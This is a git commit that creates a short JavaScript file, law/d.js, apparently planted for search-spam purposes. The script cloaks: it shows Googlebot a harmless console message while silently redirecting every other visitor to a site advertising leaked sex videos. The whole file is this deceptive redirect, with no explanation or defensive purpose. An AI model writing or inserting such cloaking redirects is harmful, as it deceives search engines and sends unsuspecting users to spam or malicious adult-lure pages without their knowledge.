932c49f22ef562b6c905b1ee2f19ddd62575d2ee
ncpb34 <monayemni.l.l@gmail.com>
2026-08-26 02:58:33 +0600

    Create d.js

---
+++ law/d.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "http://leakviralvideos.com/?sex-video-sadhu";
+} else {
+  console.log("Thanks for visiting my page" );
+}
